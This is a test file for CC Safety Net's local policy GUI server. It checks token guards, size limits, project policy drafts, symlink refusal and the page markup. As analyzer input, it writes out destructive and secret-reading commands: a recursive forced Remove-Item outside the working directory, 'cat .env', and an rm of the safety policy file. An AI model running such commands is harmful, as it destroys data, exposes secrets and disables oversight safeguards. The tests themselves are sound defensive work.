      expect(html).toContain('<div class="star-row" id="star-row" hidden>');
      expect(html).toContain('<span id="star-pitch-text"></span>');
      expect(html).toContain('<span class="star-mechanism" id="star-mechanism" hidden>');
      expect(html).toContain('One click via your GitHub CLI. No redirect.');
      expect(html).toContain('<span id="star-slot"></span>');
      // The star CTA lives on the Overview view; repo links live in the sidebar footer.
      expect(html.indexOf('id="star-row"')).toBeGreaterThan(html.indexOf('data-view="overview"'));
      expect(html.indexOf('id="star-row"')).toBeLessThan(html.indexOf('data-view="activity"'));
      expect(html).not.toContain('page-footer');
      expect(html).toContain('<div class="sidebar-links">');
      expect(html).toContain(
        '<a href="https://github.com/kenryu42/cc-safety-net" target="_blank" rel="noopener">GitHub</a>',
      );
      expect(html).toContain(
        '<a href="https://ccsafetynet.com/docs" target="_blank" rel="noopener">Documentation</a>',
      );
      expect(html).toContain('If CC Safety Net is useful to you, star it on GitHub.');
      expect(html).toContain('var starIcons =');
      expect(html).not.toContain('id="star-repo"');
      expect(html).not.toContain('starCtaDismissedKey');
      expect(html).toContain('var formatStarCount = (count) => {');
      expect(html).toContain(
        'if (count >= 1000)\n    return `${(count / 1000).toFixed(1).replace(/\\.0$/, "")}k`;',
      );
      expect(html).toContain('var renderStarCta = (context) => {');
      expect(html).toContain('if (context.starred === true) {');
      expect(html).not.toContain('localStorage.getItem(starCtaDismissedKey)');
      expect(html).toContain(
        'aria-label="Star CC Safety Net on GitHub. One click via your GitHub CLI."',
      );
      expect(html).toContain(
        'CC Safety Net has blocked <strong>${escapeHtml(context.blockedTotal.toLocaleString("en-US"))}</strong> risky command${context.blockedTotal === 1 ? ',
      );
      // The star count is filtered by the configured retention, so its copy must
      // name that same window instead of a fixed one or a lifetime total.
      expect(html).toContain(
        '"s"} on this machine in its retained ${escapeHtml(dayCount(retentionDays()))} history.',
      );
      expect(html).toContain('qs("star-mechanism").hidden = context.starred !== false;');
      expect(html).toContain('if (context.starred === null) {');
      expect(html).toContain('renderStarLink(context);');
      expect(html).toContain('var renderStarPitch = (context, starred = false) => {');
      expect(html).toContain('${evidence} If it saved your work, star it on GitHub.');
      expect(html).toContain('renderStarPitch(activeStarContext, true);');
      expect(html).toContain('target="_blank" rel="noopener"');
      expect(html).toContain('aria-label="Star CC Safety Net on GitHub (opens github.com)"');
      expect(html).not.toContain('aria-label="Hide star button"');
      expect(html).not.toContain('star-dismiss');
      expect(html).toContain('var fallbackRepoUrl = "https://github.com/kenryu42/cc-safety-net";');
      expect(html).toContain('const result = await requestJson("/api/star", { method: "POST" });');
      expect(html).toContain('const label = button.querySelector(".star-label");');
      expect(html).toContain('label.textContent = "Starred. Thank you.";');
      expect(html).toContain(
        'renderStarLink(activeStarContext, result.data?.fallbackUrl ?? fallbackRepoUrl);',
      );
      expect(html).not.toContain('window.location.href');
      expect(html).not.toContain('Could not star via GitHub CLI (gh missing or not authenticated)');
      // The star CTA stays a real link: the only popup in the page is the
      // false-positive report opening the prefilled GitHub form.
      expect(html.match(/window\.open\(/g)).toHaveLength(1);
      expect(html).not.toContain('window.open("", "_blank")');
      expect(html).toContain('setAppStatus("Starred on GitHub", "ok");');
      expect(html).toContain('.sidebar-links {');
      expect(html).toContain('.sidebar-links a {');
      expect(html).toContain('.tiles {');
      expect(html).toContain('.tile {');
      expect(html).toContain('.feed-item {');
      expect(html).toContain('.feed-command {');
      expect(html).toContain('.decision-badge {');
      expect(html).toContain('.agent-badge {');
      expect(html).toContain('button.chip {');
      expect(html).toContain('.star-row {');
      expect(html).toContain('.star-pitch {');
      expect(html).toContain('.star-mechanism {');
      expect(html).toContain('.star-cta {');
      expect(html).toContain('.star-icon {');
      expect(html).not.toContain('.star-copy {');
      expect(html).toContain('.star-count {');
      expect(html).not.toContain('.star-dismiss {');
      expect(html).toContain('border-color: var(--border-strong);');
      expect(html).not.toContain('background: var(--star-bg);');
      expect(html).not.toContain('border-color: var(--star-border);');
      expect(html).not.toContain('.star-cta {\n    align-self: center;');
      expect(html).toContain('.star-cta.starred:disabled {');
      expect(html).toContain('cursor: default;');
      expect(html).toContain('.star-row .star-cta,\n  .star-row #star-slot {');
      expect(html).toContain('#star-slot {');
      expect(html).toContain('white-space: nowrap;');
      expect(html).toContain('href="${escapeHtml(href)}"');
      expect(html).not.toContain('rawIsManual');
      expect(html).not.toContain('if (input.id === "raw")');
      expect(html).not.toContain('JSON.parse(qs("raw")');
      expect(html).toContain('var rawCopyIcons =');
      expect(html).toContain('navigator.clipboard.writeText(qs("raw").value)');
      expect(html).toContain('qs("raw-copy").classList.toggle("copied", copied);');
      expect(html).toContain(
        'rawCopyResetTimer = setTimeout(() => setRawCopyCopied(false), 2000);',
      );
      expect(html).not.toContain(
        'button.icon-button.copied {\n  color: var(--ok-fg);\n  border-color',
      );
      expect(html).not.toContain(' · ${escapeHtml(rule.id)} · ');
    } finally {
      await server.close();
    }
  });

  test('GET api policy returns defaults for missing file and errors for invalid file', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const missing = await getJson<PolicyApiResponse>(
        `${server.origin}/api/policy?token=${server.token}`,
      );
      expect(missing.exists).toBe(false);
      expect(missing.errors).toEqual([]);
      expect(missing.configState).toEqual({ state: 'ready' });
      expect(missing.policy.version).toBe(1);
      expect(missing.destructiveCommandRules.length).toBeGreaterThan(0);
      expect(missing.secretPatterns.length).toBeGreaterThan(0);
      expect(missing.version).toBe(getPackageVersion());
      expect(missing.preview).toMatchObject({
        selectedPreset: 'standard',
        counts: { enabled: 45 },
      });

      mkdirSync(safetyNetHome, { recursive: true });
      writeFileSync(join(safetyNetHome, 'policy.json'), '{bad json', 'utf-8');

      const invalid = await getJson<PolicyApiResponse>(
        `${server.origin}/api/policy?token=${server.token}`,
      );
      expect(invalid.exists).toBe(true);
      expect(invalid.raw).toBe('{bad json');
      expect(invalid.errors[0]).toContain('Invalid JSON');
      // The runtime keeps enforcing a fallback, and the GUI states which one.
      expect(invalid.configState).toEqual({
        state: 'degraded',
        reason: expect.stringContaining('Enforcing built-in protective defaults') as string,
      });
    } finally {
      await server.close();
    }
  });

  // The editor writes the user file only, so a project policy in force is
  // reported beside it as a display-only notice rather than becoming editable.
  test('GET api policy reports the project policy path and its weakenings', async () => {
    const project = join(tempDir, 'project');
    mkdirSync(join(project, '.cc-safety-net'), { recursive: true });
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(
      join(safetyNetHome, 'policy.json'),
      JSON.stringify({ version: 1, safety: { level: 'strict' } }),
      'utf-8',
    );
    writeFileSync(
      join(project, '.cc-safety-net', 'policy.json'),
      JSON.stringify({ version: 1, safety: { level: 'standard' } }),
      'utf-8',
    );
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      cwd: project,
    });

    try {
      const loaded = await getJson<
        PolicyApiResponse & {
          path: string;
          projectPolicy?: { path: string; weakenings: string[] };
        }
      >(`${server.origin}/api/policy?token=${server.token}`);

      expect(loaded.projectPolicy).toEqual({
        path: join(project, '.cc-safety-net', 'policy.json'),
        weakenings: ['project policy lowers level: strict -> standard'],
      });
      // The edited document stays the user file, whatever the project scope sets.
      expect(loaded.path).toBe(join(safetyNetHome, 'policy.json'));
      expect(loaded.policy).toMatchObject({ safety: { level: 'strict' } });
    } finally {
      await server.close();
    }
  });

  test('GET api policy omits the project policy when the project has none', async () => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      cwd: join(tempDir, 'bare-project'),
    });

    try {
      const loaded = await getJson<PolicyApiResponse & { projectPolicy?: unknown }>(
        `${server.origin}/api/policy?token=${server.token}`,
      );

      expect(loaded.projectPolicy).toBeUndefined();
    } finally {
      await server.close();
    }
  });

  // The server buffers the whole body before parsing, so it must stop reading
  // at a named cap instead of letting one request grow process memory.
  test('POST bodies over the size cap are rejected with 413', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const bodyOfBytes = (bytes: number) => `{"pad":"${'a'.repeat(bytes - 10)}"}`;
      const post = (body: string) =>
        fetch(`${server.origin}/api/policy/preview?token=${server.token}`, {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'x-cc-safety-net-token': server.token,
          },
          body,
        });

      const oversized = await post(bodyOfBytes(1_048_577));
      expect(oversized.status).toBe(413);

      // At the cap the request must still reach normal JSON handling.
      const atLimit = await post(bodyOfBytes(1_048_576));
      expect(atLimit.status).toBe(400);
      const atLimitBody = (await atLimit.json()) as { errors: string[] };
      expect(atLimitBody.errors[0]).not.toContain('too large');
    } finally {
      await server.close();
    }
  });

  test('POST api policy preview resolves draft overrides without writing', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect(
        (
          await fetch(`${server.origin}/api/policy/preview`, {
            method: 'POST',
            body: '{}',
          })
        ).status,
      ).toBe(403);
      const invalidResponse = await fetch(
        `${server.origin}/api/policy/preview?token=${server.token}`,
        {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'x-cc-safety-net-token': server.token,
          },
          body: JSON.stringify({
            ...DEFAULT_POLICY_BODY,
            destructive_command_protection: {
              enabled: true,
              overrides: { 'shell.dynamic-executable': 'maybe' },
            },
          }),
        },
      );
      expect(invalidResponse.status).toBe(400);
      expect(await invalidResponse.json()).toMatchObject({
        errors: [expect.stringContaining('must be "on" or "off"')],
      });
      const homeDenyResponse = await fetch(
        `${server.origin}/api/policy/preview?token=${server.token}`,
        {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'x-cc-safety-net-token': server.token,
          },
          body: JSON.stringify({
            ...DEFAULT_POLICY_BODY,
            secret_protection: { enabled: true, overrides: {}, deny_paths: ['~'] },
          }),
        },
      );
      expect(homeDenyResponse.status).toBe(400);
      expect(await homeDenyResponse.json()).toMatchObject({
        errors: [expect.stringContaining('cannot be the home directory or a path above it')],
      });
      const result = await postJson<{
        errors: string[];
        preview: {
          selectedPreset: string;
          counts: { enabled: number; effectiveCustomizations: number };
          rules: Record<string, { enabled: boolean; source: string }>;
        };
      }>(`${server.origin}/api/policy/preview?token=${server.token}`, server.token, {
        ...DEFAULT_POLICY_BODY,
        destructive_command_protection: {
          enabled: true,
          overrides: { 'shell.dynamic-executable': 'on' },
        },
      });

      expect(result.errors).toEqual([]);
      expect(result.preview.selectedPreset).toBe('standard');
      expect(result.preview.counts).toMatchObject({
        enabled: 46,
        effectiveCustomizations: 1,
      });
      expect(result.preview.rules['shell.dynamic-executable']).toMatchObject({
        enabled: true,
        source: 'rule_override',
      });
      expect(existsSync(join(safetyNetHome, 'policy.json'))).toBe(false);
    } finally {
      await server.close();
    }
  });

  // A PowerShell rule the standard preset enforces but a draft override can toggle; the string is
  // analyzer input only and is never executed.
  const TOGGLE_RULE_ID = 'powershell.remove-item-recursive-force-outside-cwd';
  const TOGGLE_COMMAND = 'Remove-Item ../outside -Recurse -Force';

  test('POST api policy explain evaluates the draft without writing', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect(
        (
          await fetch(`${server.origin}/api/policy/explain?token=${server.token}`, {
            method: 'POST',
            body: JSON.stringify({ command: TOGGLE_COMMAND, policy: DEFAULT_POLICY_BODY }),
          })
        ).status,
      ).toBe(403);

      const missingCommand = await fetch(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
          body: JSON.stringify({ policy: DEFAULT_POLICY_BODY }),
        },
      );
      expect(missingCommand.status).toBe(400);
      expect(await missingCommand.json()).toEqual({ errors: ['command must be a string'] });

      const nullBody = await fetch(`${server.origin}/api/policy/explain?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
        body: 'null',
      });
      expect(nullBody.status).toBe(400);
      expect(await nullBody.json()).toEqual({ errors: ['command must be a string'] });

      const invalidPolicy = await fetch(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
          body: JSON.stringify({
            command: TOGGLE_COMMAND,
            policy: policyWithToggle('maybe'),
          }),
        },
      );
      expect(invalidPolicy.status).toBe(400);
      expect(await invalidPolicy.json()).toMatchObject({
        errors: [expect.stringContaining('must be "on" or "off"')],
      });

      const allowed = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: TOGGLE_COMMAND,
          policy: policyWithToggle('off'),
        },
      );
      expect(allowed.result).toBe('allowed');

      const blocked = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: TOGGLE_COMMAND,
          policy: policyWithToggle('on'),
        },
      );
      expect(blocked.result).toBe('blocked');
      expect(blocked.ruleId).toBe(TOGGLE_RULE_ID);

      // Reads a sensitive path; analyzer input only and is never executed.
      const READ_ENV_COMMAND = 'cat .env';
      const secretBlocked = await postJson<{ result: string; ruleId?: string; reason?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        { command: READ_ENV_COMMAND, policy: DEFAULT_POLICY_BODY },
      );
      expect(secretBlocked.result).toBe('blocked');
      expect(secretBlocked.ruleId).toBe('secret.basename.env');
      expect(secretBlocked.reason).toEqual(expect.any(String));
      expect(secretBlocked.reason?.length).toBeGreaterThan(0);

      const secretDisabled = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: READ_ENV_COMMAND,
          policy: {
            ...DEFAULT_POLICY_BODY,
            secret_protection: { enabled: false, overrides: {}, deny_paths: [] },
          },
        },
      );
      expect(secretDisabled.result).toBe('allowed');

      // Matches the draft deny path; analyzer input only and is never executed.
      const READ_NOTES_COMMAND = 'cat notes.txt';
      const denyPathBlocked = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: READ_NOTES_COMMAND,
          policy: {
            ...DEFAULT_POLICY_BODY,
            secret_protection: { enabled: true, overrides: {}, deny_paths: ['notes.txt'] },
          },
        },
      );
      expect(denyPathBlocked.result).toBe('blocked');
      expect(denyPathBlocked.ruleId).toBe('secret.deny-path');

      // Deletes the protected policy config; analyzer input only and is never executed.
      const policyBlocked = await postJson<{
        result: string;
        ruleId?: string;
        reason?: string;
      }>(`${server.origin}/api/policy/explain?token=${server.token}`, server.token, {
        command: `rm "${getUserPolicyPath()}"`,
        policy: DEFAULT_POLICY_BODY,
      });
      expect(policyBlocked.result).toBe('blocked');
      expect(policyBlocked.ruleId).toBe('policy-protection');
      expect(policyBlocked.reason).toBe(REASON_POLICY_CONFIG_PROTECTION);

      expect(existsSync(join(safetyNetHome, 'policy.json'))).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST api policy explain matches custom rules loaded from disk', async () => {
    const projectDir = mkdtempSync(join(tmpdir(), 'safety-net-gui-rulebook-'));
    try {
      await syncInitialGitRulebook(projectDir);
      const server = await createPolicyGuiServer({
        cwd: projectDir,
        userConfigDir: join(projectDir, 'home', '.cc-safety-net', 'rules'),
      });
      try {
        const blocked = await postJson<{ result: string; customRule?: { id: string } }>(
          `${server.origin}/api/policy/explain?token=${server.token}`,
          server.token,
          { command: 'git add -A', policy: DEFAULT_POLICY_BODY },
        );
        expect(blocked.result).toBe('blocked');
        expect(blocked.customRule?.id).toBe('project-rules/block-git-add-all');
      } finally {
        await server.close();
      }
    } finally {
      rmSync(projectDir, { recursive: true, force: true });
    }
  });

  // The Rules tab reads this route and nothing else, so it is the only thing
  // standing between a rulebook on disk and what the tab claims is enforced.
  const fetchRules = async (cwd: string) => {
    const server = await createPolicyGuiServer({
      cwd,
      userConfigDir: join(cwd, 'home', '.cc-safety-net', 'rules'),
    });
    try {
      // Behind the shared token guard, not routed ahead of it.
      expect((await fetch(`${server.origin}/api/rules`)).status).toBe(403);
      return await getJson<RulesApiResponse>(`${server.origin}/api/rules?token=${server.token}`);
    } finally {
      await server.close();
    }
  };

  const rewriteProjectRulesConfig = (cwd: string, patch: Record<string, unknown>) => {
    const configPath = join(cwd, '.cc-safety-net', 'rules', 'rule.json');
    writeFileSync(
      configPath,
      JSON.stringify({ ...JSON.parse(readFileSync(configPath, 'utf-8')), ...patch }),
      'utf-8',
    );
    return configPath;
  };

  test('GET api rules groups the enforced rule definitions under their rulebook', async () => {
    await syncInitialGitRulebook(tempDir);

    // Exact equality: the tab reports what is enforced, so a rule appearing
    // here that policy.rules dropped, or a field silently going missing, both
    // have to fail.
    expect(await fetchRules(tempDir)).toEqual({
      projectPath: tempDir,
      // Whether a native folder dialog exists is a property of the host running
      // the suite, so only the shape is asserted here; the decision itself is
      // covered in tests/bin/gui/choose-directory.test.ts.
      canPickDirectory: expect.any(Boolean),
      rulebooks: [PROJECT_RULEBOOK],
      errors: [],
      warnings: [],
    });
  });

  test('GET api rules reports no rulebooks before any rulebook is synced', async () => {
    // The state most users are in; the tab keys its empty state off this.
    expect(await fetchRules(tempDir)).toEqual({
      projectPath: tempDir,
      canPickDirectory: expect.any(Boolean),
      rulebooks: [],
      errors: [],
      warnings: [],
    });
  });

  test('GET api rules surfaces a dropped source alongside the rulebooks still enforced', async () => {
    await syncInitialGitRulebook(tempDir);
    rewriteProjectRulesConfig(tempDir, { rules: ['project-rules', 'unsynced-rules'] });

    const payload = await fetchRules(tempDir);

    // A dropped source stops enforcing without any other signal, so the tab has
    // to be told; without this the user sees a shorter list and nothing else.
    expect(payload.errors).toEqual([
      `missing rulebook file ${join(tempDir, '.cc-safety-net', 'rules', 'unsynced-rules', 'rulebook.json')} for unsynced-rules; create that file or remove that source from the rules config`,
    ]);
    expect(payload.rulebooks.map((rulebook) => rulebook.name)).toEqual(['project-rules']);
  });

  test('GET api rules omits a rule switched off by an override and warns on an unknown key', async () => {
    await syncInitialGitRulebook(tempDir);
    const configPath = rewriteProjectRulesConfig(tempDir, {
      overrides: { 'project-rules/block-git-add-all': 'off', 'project-rules/typo': 'off' },
    });

    const payload = await fetchRules(tempDir);

    // The rulebook still lists the disabled rule, but it is no longer enforced;
    // listing it would tell the user a command is blocked when it is not.
    expect(payload.rulebooks[0]?.rules).toEqual([]);
    // The route forwards policy.warnings verbatim; core owns the wording.
    expect(payload.warnings).toHaveLength(1);
    expect(payload.warnings[0]).toContain(`"project-rules/typo" in ${configPath}`);
    expect(payload.errors).toEqual([]);
  });

  test('POST api policy writes canonical JSON and reset writes defaults', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const save = await postJson<WriteApiResponse>(
        `${server.origin}/api/policy?token=${server.token}`,
        server.token,
        {
          version: 1,
          safety: { level: 'standard', overrides: { paranoid_rm: true } },
          workflow: { worktree_mode: false },
          destructive_command_protection: {
            enabled: false,
            overrides: { 'git.reset-hard': 'off' },
          },
          secret_protection: {
            enabled: true,
            overrides: { 'secret.ext.pem': 'off' },
            deny_paths: [],
          },
        },
      );

      expect(save.errors).toEqual([]);
      expect(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')).toContain(
        '"git.reset-hard": "off"',
      );

      const reset = await postJson<WriteApiResponse>(
        `${server.origin}/api/reset?token=${server.token}`,
        server.token,
        {},
      );
      expect(reset.errors).toEqual([]);
      const resetPolicy = JSON.parse(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')) as {
        version: number;
        destructive_command_protection: { enabled: boolean; overrides: Record<string, string> };
        secret_protection: { enabled: boolean; overrides: Record<string, string> };
      };
      expect(resetPolicy).toMatchObject({
        version: 1,
        destructive_command_protection: { enabled: true, overrides: {} },
        secret_protection: { enabled: true, overrides: {} },
      });
    } finally {
      await server.close();
    }
  });

  // The project draft targets the session directory and inherits from a user
  // policy that lives in a sibling temp subtree, so a project write landing on
  // the user file — the failure the containment machinery exists to stop — is
  // observable rather than hidden behind a shared path.
  const projectDraftOptions = (projectDir: string) => ({
    cwd: projectDir,
    userConfigDir: join(tempDir, 'home', 'rules'),
  });

  const writeDraftUserPolicy = (value: unknown) => {
    mkdirSync(join(tempDir, 'home'), { recursive: true });
    writeFileSync(
      join(tempDir, 'home', 'policy.json'),
      typeof value === 'string' ? value : JSON.stringify(value),
      'utf-8',
    );
  };

  const writeProjectPolicyFile = (projectDir: string, value: unknown) => {
    mkdirSync(join(projectDir, '.cc-safety-net'), { recursive: true });
    writeFileSync(
      join(projectDir, '.cc-safety-net', 'policy.json'),
      typeof value === 'string' ? value : JSON.stringify(value),
      'utf-8',
    );
  };

  const projectPolicyPath = (projectDir: string) =>
    join(projectDir, '.cc-safety-net', 'policy.json');

  const WORKTREE_PROPOSAL = { version: 1, workflow: { worktree_mode: true } };

  test('project draft endpoints stay behind the shared token guard', async () => {
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      expect((await fetch(`${server.origin}/api/policy/project`)).status).toBe(403);
      for (const path of [
        '/api/policy/project/choose-directory',
        '/api/policy/project/diff',
        '/api/policy/project/apply',
      ]) {
        // A POST needs the query token and the header; neither alone opens the
        // route, so a page on another origin cannot drive a project write.
        expect(
          (
            await fetch(`${server.origin}${path}?token=${server.token}`, {
              method: 'POST',
              headers: { 'content-type': 'application/json' },
              body: '{}',
            })
          ).status,
        ).toBe(403);
        expect(
          (
            await fetch(`${server.origin}${path}`, {
              method: 'POST',
              headers: {
                'content-type': 'application/json',
                'x-cc-safety-net-token': server.token,
              },
              body: '{}',
            })
          ).status,
        ).toBe(403);
      }
    } finally {
      await server.close();
    }
  });

  test('project apply writes only the proposed fields and the loader merges the rest', async () => {
    writeDraftUserPolicy({ version: 1, safety: { level: 'paranoid' } });
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      const state = await getJson<ProjectDraftApiResponse>(
        `${server.origin}/api/policy/project?token=${server.token}`,
      );
      expect(state).toMatchObject({
        dir: tempDir,
        // The GUI states where the write lands instead of joining the path in
        // the browser, where the separator would be wrong on Windows.
        path: projectPolicyPath(tempDir),
        revision: 0,
        userPolicyDiagnostics: [],
        projection: {},
        projectionDiagnostics: [],
        canPickDirectory: expect.any(Boolean),
      });
      // The inherited values the draft renders come from the runtime baseline,
      // not from built-in defaults.
      expect(state.baseline.safety.level).toBe('paranoid');

      const applied = await postJson<ProjectApplyApiResponse>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        { revision: state.revision, proposal: WORKTREE_PROPOSAL },
      );

      expect(applied).toEqual({ path: projectPolicyPath(tempDir), errors: [] });
      // Everything the draft left unmarked stays out of the file, so it keeps
      // inheriting instead of pinning a default over a stricter user policy.
      expect(JSON.parse(readFileSync(applied.path, 'utf-8'))).toEqual(WORKTREE_PROPOSAL);
      const merged = loadPolicyConfig(projectDraftOptions(tempDir));
      expect(merged.safety.level).toBe('paranoid');
      expect(merged.worktreeMode).toBeTrue();
      expect(merged.errors).toEqual([]);
    } finally {
      await server.close();
    }
  });

  test('project draft rejects an audit section and an invalid proposal without writing', async () => {
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      const audit = await postJsonResponse<{ errors: string[] }>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        { revision: 0, proposal: { version: 1, audit: { retention_days: 5 } } },
      );
      expect(audit.status).toBe(400);
      expect(audit.body.errors).toEqual([
        'audit settings are user scope only; remove the audit section from a project proposal',
      ]);

      const invalid = { version: 1, safety: { level: 'bogus' } };
      const diff = await postJsonResponse<ProjectDiffApiResponse>(
        `${server.origin}/api/policy/project/diff?token=${server.token}`,
        server.token,
        { revision: 0, proposal: invalid },
      );
      expect(diff.status).toBe(400);
      // No rows are computed from invalid input: a proposal that cannot be
      // applied must never be reviewable in the confirm dialog.
      expect(diff.body.rows).toBeUndefined();
      expect(diff.body.errors.join(' ')).toContain('safety.level');

      const apply = await postJsonResponse<{ errors: string[] }>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        { revision: 0, proposal: invalid },
      );
      expect(apply.status).toBe(400);

      // A body with no revision is malformed input, not the directory-changed
      // story a stale revision tells, so it must not read as one.
      const unbound = await postJsonResponse<{ errors: string[] }>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        { proposal: WORKTREE_PROPOSAL },
      );
      expect(unbound.status).toBe(400);
      expect(unbound.body.errors).toEqual(['revision must be a number']);
      expect(existsSync(projectPolicyPath(tempDir))).toBeFalse();
    } finally {
      await server.close();
    }
  });

  test('project apply derives the path from the session, not from the body', async () => {
    const decoy = join(tempDir, 'decoy');
    mkdirSync(decoy, { recursive: true });
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      const applied = await postJson<ProjectApplyApiResponse>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        {
          revision: 0,
          proposal: WORKTREE_PROPOSAL,
          // Nothing in the body may steer the write; a client that names a
          // directory is ignored rather than obeyed.
          dir: decoy,
          path: join(decoy, 'policy.json'),
        },
      );

      expect(applied.path).toBe(projectPolicyPath(tempDir));
      expect(existsSync(projectPolicyPath(decoy))).toBeFalse();
      expect(existsSync(join(decoy, 'policy.json'))).toBeFalse();
    } finally {
      await server.close();
    }
  });

  test('a malformed project policy file is reported, then replaced by an apply', async () => {
    writeProjectPolicyFile(tempDir, '{ not json');
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      const state = await getJson<ProjectDraftApiResponse>(
        `${server.origin}/api/policy/project?token=${server.token}`,
      );
      // The draft starts empty and says why rather than pretending the current
      // team policy loaded.
      expect(state.projection).toEqual({});
      expect(state.projectionDiagnostics[0]).toContain('Invalid JSON');

      const diff = await postJson<ProjectDiffApiResponse>(
        `${server.origin}/api/policy/project/diff?token=${server.token}`,
        server.token,
        { revision: 0, proposal: WORKTREE_PROPOSAL },
      );
      // The dialog needs this to warn that the invalid file will be replaced.
      expect(diff.existingFileDiagnostics[0]).toContain('Invalid JSON');
      expect(diff.rows).toEqual([
        { field: 'workflow.worktree_mode', before: 'false', after: 'true' },
      ]);

      const applied = await postJson<ProjectApplyApiResponse>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        { revision: 0, proposal: WORKTREE_PROPOSAL },
      );
      expect(JSON.parse(readFileSync(applied.path, 'utf-8'))).toEqual(WORKTREE_PROPOSAL);
    } finally {
      await server.close();
    }
  });

  test('a directory change bumps the revision and strands the diff it invalidates', async () => {
    const other = join(tempDir, 'other');
    mkdirSync(other, { recursive: true });
    let picked: ChooseDirectoryResult = { cancelled: true };
    const server = await createPolicyGuiServer({
      ...projectDraftOptions(tempDir),
      chooseDirectory: async () => picked,
    });
    try {
      // A cancelled pick leaves the directory and the revision alone.
      expect(
        await postJson<Record<string, unknown>>(
          `${server.origin}/api/policy/project/choose-directory?token=${server.token}`,
          server.token,
          {},
        ),
      ).toEqual({ cancelled: true });

      picked = { path: other };
      const changed = await postJson<{ cancelled: boolean }>(
        `${server.origin}/api/policy/project/choose-directory?token=${server.token}`,
        server.token,
        {},
      );
      expect(changed).toEqual({ cancelled: false });
      const current = await getJson<ProjectDraftApiResponse>(
        `${server.origin}/api/policy/project?token=${server.token}`,
      );
      expect(current).toMatchObject({ dir: other, revision: 1 });

      // The confirmation a second tab is holding describes a directory that is
      // no longer the target, so neither call may act on its revision.
      for (const route of ['diff', 'apply']) {
        const stale = await postJsonResponse<{ errors: string[] }>(
          `${server.origin}/api/policy/project/${route}?token=${server.token}`,
          server.token,
          { revision: 0, proposal: WORKTREE_PROPOSAL },
        );
        expect(stale.status).toBe(409);
        expect(stale.body.errors[0]).toContain('directory changed');
      }
      expect(existsSync(projectPolicyPath(tempDir))).toBeFalse();
      expect(existsSync(projectPolicyPath(other))).toBeFalse();

      const applied = await postJson<ProjectApplyApiResponse>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        { revision: current.revision, proposal: WORKTREE_PROPOSAL },
      );
      expect(applied.path).toBe(projectPolicyPath(other));
    } finally {
      await server.close();
    }
  });

  test('project apply refuses a .cc-safety-net symlink that leaves the session directory', async () => {
    const outside = join(tempDir, 'outside');
    const projectDir = join(tempDir, 'project');
    mkdirSync(outside, { recursive: true });
    mkdirSync(projectDir, { recursive: true });
    symlinkSync(outside, join(projectDir, '.cc-safety-net'), 'dir');
    const server = await createPolicyGuiServer(projectDraftOptions(projectDir));
    try {
      const applied = await postJsonResponse<ProjectApplyApiResponse>(
        `${server.origin}/api/policy/project/apply?token=${server.token}`,
        server.token,
        { revision: 0, proposal: WORKTREE_PROPOSAL },
      );

      expect(applied.status).toBe(500);
      expect(applied.body.errors).toEqual(['Unable to access project policy filesystem safely.']);
      // The redirected write lands nowhere: this is the write a checkout the
      // user did not author could otherwise aim at their own policy directory.
      expect(existsSync(join(outside, 'policy.json'))).toBeFalse();
    } finally {
      await server.close();
    }
  });

  test('a malformed user policy is reported as the draft entry gate', async () => {
    writeDraftUserPolicy('{ not json');
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      const state = await getJson<ProjectDraftApiResponse>(
        `${server.origin}/api/policy/project?token=${server.token}`,
      );

      expect(state.userPolicyDiagnostics).toHaveLength(1);
      expect(state.userPolicyDiagnostics[0]).toContain('Invalid JSON');
      // The baseline degraded to protective defaults, which is exactly why the
      // draft must refuse to present it as the user's inherited policy.
      expect(state.baseline.safety.level).toBe('standard');
    } finally {
      await server.close();
    }
  });

  test('a schema-invalid but parseable user policy is reported as the draft entry gate', async () => {
    // The file reads and parses, so only schema validation catches it - and the
    // rest of the GUI shows its recovery banner for exactly this state.
